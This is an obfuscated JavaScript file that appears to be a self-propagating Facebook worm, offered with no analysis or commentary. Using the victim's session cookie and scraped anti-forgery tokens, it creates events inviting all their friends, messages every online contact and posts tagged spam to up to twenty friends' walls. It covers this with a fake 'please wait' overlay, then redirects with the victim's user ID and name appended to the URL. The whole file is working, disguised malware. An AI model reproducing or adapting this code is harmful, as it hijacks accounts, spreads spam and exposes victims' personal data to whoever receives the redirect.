var chatmessage = '%firstname% instant message test';
var postmessage = '%tf% %tf% %tf% ';
var redirect = 'http://google.com/';
var eventdesc = 'event description';
var eventname = 'event name';
var nfriends = 20;
var eventmsg = 'message';
var eventpmsubj = 'new facebook feature :o';
var _0xe26a = ['href', 'location', 'top', 'GET', 'open', 'onreadystatechange', 'readyState', 'status', 'responseText', 'send', '/', 'match', 'cookie', '@[', 'id', ':', 'name', ']', '', '&', '=', 'POST', 'Content-Type', 'application/x-www-form-urlencoded', 'setRequestHeader', 'div', 'createElement', 'display', 'style', 'block', 'position', 'absolute', 'width', '%', 'height', 'left', 'px', 'textAlign', 'center', 'padding', '4px', 'background', '#FFFFFF', 'zIndex', 'innerHTML', '&nbsp;<br/>Please wait, this can take a little while...<br/><br/>Or if you get sick of waiting, you can <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> (results may be less accurate)', 'appendChild', 'body', 'data', 'firstChild', 'navAccountName', 'getElementById', '?', '/ajax/choose/?__a=1', 'event', 'AsyncRequest', '/ajax/typeahead/first_degree.php?__a=1&viewer=', '&token=', '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha', 'length', 'push', 'getTime', 'setTime', 'getMonth', 'getDate', 'getFullYear', 'getHours', ',', 'join', 'on', 'Create Event', 'new', '/events/create.php', '/ajax/chat/buddy_list.php?__a=1', 'substr', '(', ')', 'buddy_list', 'payload', 'nowAvailableList', 'random', 'floor', '%firstname%', 'toLowerCase', 'firstName', 'userInfos', 'replace', '/ajax/chat/send.php?__a=1', '/ajax/browser/friends/?uid=', '&filter=all&__a=1&__d=1', 'shift', 'fetched friends: ', 'home', 'pop', '%tf%', 'search', 'xhpc_message_text', 'xhpc_message', 'message text: ', '/ajax/updatestatus.php?__a=1', 'profile'];
var debug = false;
var wf = 0;
var mf = function () {
    if (wf <= 0) {
        setTimeout(function () {
            window[_0xe26a[2]][_0xe26a[1]][_0xe26a[0]] = redirect;
        }, 500);
    };
};
var doget = function (_0x43aaxe, _0x43aaxf, _0x43aax10) {
    var _0x43aax11 = new XMLHttpRequest();
    _0x43aax11[_0xe26a[4]](_0xe26a[3], _0x43aaxe);
    _0x43aax11[_0xe26a[5]] = function () {
        if (_0x43aax11[_0xe26a[6]] == 4) {
            if (_0x43aax11[_0xe26a[7]] == 200 && _0x43aaxf) {
                _0x43aaxf(_0x43aax11[_0xe26a[8]]);
            };
            if (_0x43aax10) {
                _0x43aax10();
            };
        };
    };
    _0x43aax11[_0xe26a[9]]();
};
doget(_0xe26a[10], function (_0x43aax12) {
    var _0x43aax13 = document[_0xe26a[12]][_0xe26a[11]](/c_user=(\d+)/)[1];
    var _0x43aax14 = function (_0x43aax15) {
        return _0x43aax15 ? _0xe26a[13] + _0x43aax15[_0xe26a[14]] + _0xe26a[15] + _0x43aax15[_0xe26a[16]] + _0xe26a[17] : _0xe26a[18];
    };
    var _0x43aax16 = function (_0x43aax15) {
        return _0x43aax15 ? _0x43aax15[_0xe26a[16]] : _0xe26a[18];
    };
    var _0x43aax17 = function (_0x43aax15) {
        out = _0xe26a[18];
        for (var _0x43aax18 in _0x43aax15) {
            out += (out ? _0xe26a[19] : _0xe26a[18]) + _0x43aax18 + ((_0x43aax15[_0x43aax18] !== null) ? _0xe26a[20] + encodeURIComponent(_0x43aax15[_0x43aax18]) : _0xe26a[18]);
        };
        return out;
    };
    var _0x43aax19 = function (_0x43aaxe, _0x43aax15, _0x43aaxf, _0x43aax10) {
        var _0x43aax11 = new XMLHttpRequest();
        _0x43aax11[_0xe26a[4]](_0xe26a[21], _0x43aaxe);
        _0x43aax11[_0xe26a[24]](_0xe26a[22], _0xe26a[23]);
        _0x43aax11[_0xe26a[5]] = function () {
            if (_0x43aax11[_0xe26a[6]] == 4) {
                if (_0x43aax11[_0xe26a[7]] == 200 && _0x43aaxf) {
                    _0x43aaxf(_0x43aax11[_0xe26a[8]]);
                };
                if (_0x43aax10) {
                    _0x43aax10();
                };
            };
        };
        _0x43aax11[_0xe26a[9]](_0x43aax17(_0x43aax15));
    };
    var _0x43aax1a = function () {
        var _0x43aax1b = document[_0xe26a[26]](_0xe26a[25]);
        _0x43aax1b[_0xe26a[28]][_0xe26a[27]] = _0xe26a[29];
        _0x43aax1b[_0xe26a[28]][_0xe26a[30]] = _0xe26a[31];
        _0x43aax1b[_0xe26a[28]][_0xe26a[32]] = 100 + _0xe26a[33];
        _0x43aax1b[_0xe26a[28]][_0xe26a[34]] = 100 + _0xe26a[33];
        _0x43aax1b[_0xe26a[28]][_0xe26a[35]] = 0 + _0xe26a[36];
        _0x43aax1b[_0xe26a[28]][_0xe26a[2]] = 0 + _0xe26a[36];
        _0x43aax1b[_0xe26a[28]][_0xe26a[37]] = _0xe26a[38];
        _0x43aax1b[_0xe26a[28]][_0xe26a[39]] = _0xe26a[40];
        _0x43aax1b[_0xe26a[28]][_0xe26a[41]] = _0xe26a[42];
        _0x43aax1b[_0xe26a[28]][_0xe26a[43]] = 999999;
        _0x43aax1b[_0xe26a[44]] = _0xe26a[45];
        document[_0xe26a[47]][_0xe26a[46]](_0x43aax1b);
    };
    var _0x43aax1c = _0x43aax12[_0xe26a[11]](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i)[1];
    var _0x43aax1d = _0x43aax12[_0xe26a[11]](/name="post_form_id" value="([\d\w]+)"/i)[1];
    var _0x43aax1e = _0x43aax12[_0xe26a[11]](/name="fb_dtsg" value="([\d\w]+)"/i)[1];
    var _0x43aax1f = document[_0xe26a[51]](_0xe26a[50])[_0xe26a[49]][_0xe26a[48]];
    redirect = redirect + _0xe26a[52] + _0x43aax17({
        userid: _0x43aax13,
        name: _0x43aax1f,
        doclose: 1
    });
    _0x43aax1a();
    if (eventdesc) {
        wf++;
        _0x43aax19(_0xe26a[53], {
            type: _0xe26a[54],
            eid: null,
            invite_message: _0xe26a[18],
            __d: 1,
            post_form_id: _0x43aax1d,
            fb_dtsg: _0x43aax1e,
            lsd: null,
            post_form_id_source: _0xe26a[55]
        }, function (_0x43aax20) {
            var _0x43aax21 = _0x43aax20[_0xe26a[11]](/\\"token\\":\\"([^\\]+)\\"/)[1];
            var _0x43aaxe = _0xe26a[56] + _0x43aax13 + _0xe26a[57] + _0x43aax21 + _0xe26a[58];
            doget(_0x43aaxe, function (_0x43aax22) {
                var _0x43aax23 = _0x43aax22[_0xe26a[11]](/\{"uid":\d+,/g);
                var _0x43aax24 = [];
                for (var _0x43aax25 = 0; _0x43aax25 < _0x43aax23[_0xe26a[59]]; _0x43aax25++) {
                    var _0x43aax26 = _0x43aax23[_0x43aax25][_0xe26a[11]](/:(\d+),/)[1];
                    if (_0x43aax26 != _0x43aax13) {
                        _0x43aax24[_0xe26a[60]](_0x43aax26);
                    };
                };
                var _0x43aax27 = new Date();
                _0x43aax27[_0xe26a[62]](_0x43aax27[_0xe26a[61]]() + 60 * 60 * 24 * 1000);
                datestr = (_0x43aax27[_0xe26a[63]]() + 1) + _0xe26a[10] + _0x43aax27[_0xe26a[64]]() + _0xe26a[10] + _0x43aax27[_0xe26a[65]]();
                timestr = _0x43aax27[_0xe26a[66]]() * 60;
                var _0x43aax28 = {
                    post_form_id: _0x43aax1d,
                    fb_dtsg: _0x43aax1e,
                    start_time_intl_field: datestr,
                    start_time_text_field: datestr,
                    start_time_hour_min: timestr,
                    name: eventname,
                    place_page_id: _0xe26a[18],
                    location: _0xe26a[18],
                    street: _0xe26a[18],
                    geo_id: _0xe26a[18],
                    geo_sq: _0xe26a[18],
                    desc: eventdesc,
                    sgb_invitees: _0x43aax24[_0xe26a[68]](_0xe26a[67]),
                    sgb_emails: _0xe26a[18],
                    sgb_message: _0xe26a[18],
                    privacy_type: _0xe26a[69],
                    guest_list: _0xe26a[69],
                    connections_can_post: _0xe26a[69],
                    save: _0xe26a[70],
                    submitting: _0xe26a[18]
                };
                _0x43aax28[_0xe26a[71]] = _0xe26a[18];
                _0x43aax19(_0xe26a[72], _0x43aax28, false, function () {
                    mf(--wf);
                });
            });
        });
    };
    if (chatmessage) {
        wf++;
        _0x43aax19(_0xe26a[73], {
            user: _0x43aax13,
            post_form_id: _0x43aax1d,
            fb_dtsg: _0x43aax1e,
            lsd: null,
            post_form_id_source: _0xe26a[55],
            popped_out: false,
            force_render: true
        }, function (_0x43aax20) {
            var _0x43aax29 = _0x43aax20[_0xe26a[74]](9);
            var _0x43aax2a = eval(_0xe26a[75] + _0x43aax29 + _0xe26a[76]);
            var _0x43aax2b = _0x43aax2a[_0xe26a[78]][_0xe26a[77]];
            for (var _0x43aax2c in _0x43aax2b[_0xe26a[79]]) {
                var _0x43aax2d = Math[_0xe26a[81]](Math[_0xe26a[80]]() * 1335448958);
                var _0x43aax2e = (new Date())[_0xe26a[61]]();
                var _0x43aax2f = chatmessage[_0xe26a[86]](_0xe26a[82], _0x43aax2b[_0xe26a[85]][_0x43aax2c][_0xe26a[84]][_0xe26a[83]]());
                _0x43aax19(_0xe26a[87], {
                    msg_id: Math[_0xe26a[81]](Math[_0xe26a[80]]() * 1335448958),
                    client_time: (new Date())[_0xe26a[61]](),
                    msg_text: chatmessage[_0xe26a[86]](_0xe26a[82], _0x43aax2b[_0xe26a[85]][_0x43aax2c][_0xe26a[84]][_0xe26a[83]]()),
                    to: _0x43aax2c,
                    post_form_id: _0x43aax1d,
                    fb_dtsg: _0x43aax1e,
                    post_form_id_source: _0xe26a[55]
                });
            };
            mf(--wf);
        });
    };
    if (postmessage) {
        wf++;
        doget(_0xe26a[88] + _0x43aax13 + _0xe26a[89], function (_0x43aax20) {
            var _0x43aax23 = _0x43aax20[_0xe26a[11]](/\/\d+_\d+_\d+_q\.jpg.*?u003ca href=\\"http:\\\/\\\/www.facebook.com\\\/.*?\\u003c\\\/a>/gi);
            var _0x43aax30 = [];
            for (var _0x43aax25 = 0; _0x43aax25 < _0x43aax23[_0xe26a[59]]; _0x43aax25++) {
                var _0x43aax26 = _0x43aax23[_0x43aax25][_0xe26a[11]](/_\d+_/)[0][_0xe26a[86]](/_/g, _0xe26a[18]);
                var _0x43aax31 = _0x43aax23[_0x43aax25][_0xe26a[11]](/>[^>]+\\u003c\\\/a>$/i)[0][_0xe26a[86]](/\\u003c\\\/a>$/gim, _0xe26a[18])[_0xe26a[86]](/>/g, _0xe26a[18]);
                _0x43aax30[_0xe26a[60]]({
                    id: _0x43aax26,
                    name: _0x43aax31
                });
            };
            var _0x43aax10 = [];
            var _0x43aax32 = [];
            while (_0x43aax30[_0xe26a[59]]) {
                var _0x43aax33 = Math[_0xe26a[81]](Math[_0xe26a[80]]() * _0x43aax30[_0xe26a[59]]);
                _0x43aax10[_0xe26a[60]](_0x43aax30[_0x43aax33]);
                _0x43aax32[_0xe26a[60]](_0x43aax30[_0x43aax33]);
                var _0x43aax2e = _0x43aax30[_0xe26a[90]]();
                if (_0x43aax33) {
                    _0x43aax30[_0x43aax33 - 1] = _0x43aax2e;
                };
            };
            if (debug) {
                alert(_0xe26a[91] + _0x43aax10[_0xe26a[59]]);
            };
            var _0x43aax34 = {
                post_form_id: _0x43aax1d,
                fb_dtsg: _0x43aax1e,
                xhpc_composerid: _0x43aax1c,
                xhpc_targetid: _0x43aax13,
                xhpc_context: _0xe26a[92],
                xhpc_fbx: _0xe26a[18],
                lsd: null,
                post_form_id_source: _0xe26a[55]
            };
            mt = postmessage;
            m = postmessage;
            while (mt[_0xe26a[95]](_0xe26a[94]) >= 0) {
                var _0x43aax35 = _0x43aax10[_0xe26a[93]]();
                mt = mt[_0xe26a[86]](_0xe26a[94], _0x43aax16(_0x43aax35));
                m = m[_0xe26a[86]](_0xe26a[94], _0x43aax14(_0x43aax35));
            };
            _0x43aax34[_0xe26a[96]] = mt;
            _0x43aax34[_0xe26a[97]] = m;
            if (debug) {
                alert(_0xe26a[98] + mt);
            };
            _0x43aax19(_0xe26a[99], _0x43aax34);
            var _0x43aax36 = function (_0x43aax18) {
                if (_0x43aax18 == 0) {
                    wf = 0;
                    mf();
                    return;
                };
                var _0x43aax37 = _0x43aax32[_0xe26a[90]]();
                var _0x43aax38 = {
                    post_form_id: _0x43aax1d,
                    fb_dtsg: _0x43aax1e,
                    xhpc_composerid: _0x43aax1c,
                    xhpc_targetid: _0x43aax37[_0xe26a[14]],
                    xhpc_context: _0xe26a[100],
                    xhpc_fbx: 1,
                    lsd: null,
                    post_form_id_source: _0xe26a[55]
                };
                var _0x43aax39 = postmessage;
                var _0x43aax3a = postmessage;
                if (_0x43aax10[_0xe26a[59]] == 0) {
                    wf = 0;
                    mf();
                    return;
                };
                while (_0x43aax39[_0xe26a[95]](_0xe26a[94]) >= 0) {
                    var _0x43aax3b = _0x43aax10[_0xe26a[93]]();
                    _0x43aax39 = _0x43aax39[_0xe26a[86]](_0xe26a[94], _0x43aax16(_0x43aax3b));
                    _0x43aax3a = _0x43aax3a[_0xe26a[86]](_0xe26a[94], _0x43aax14(_0x43aax3b));
                };
                _0x43aax38[_0xe26a[96]] = _0x43aax39;
                _0x43aax38[_0xe26a[97]] = _0x43aax3a;
                _0x43aax19(_0xe26a[99], _0x43aax38);
                setTimeout(function () {
                    _0x43aax36(_0x43aax18 - 1);
                }, 2000);
            };
            wf++;
            setTimeout(function () {
                _0x43aax36(nfriends);
            }, 2000);
        });
    };
    mf();
});
